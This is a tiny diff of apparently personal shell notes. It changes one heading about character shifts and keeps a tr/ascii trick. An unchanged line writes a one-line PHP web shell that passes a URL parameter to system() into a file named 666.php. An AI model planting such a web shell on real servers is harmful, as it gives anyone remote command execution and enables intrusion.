@@ -1,7 +1,7 @@
 sudo sh -c "echo '<?php system($_GET['cmd']); ?>' >> 666.php"
 
 
-characters shifts:
+characters shifts:      映射
   man ascii
   echo $(tr '!-}' '"-~'<<<[)
     $():    get value
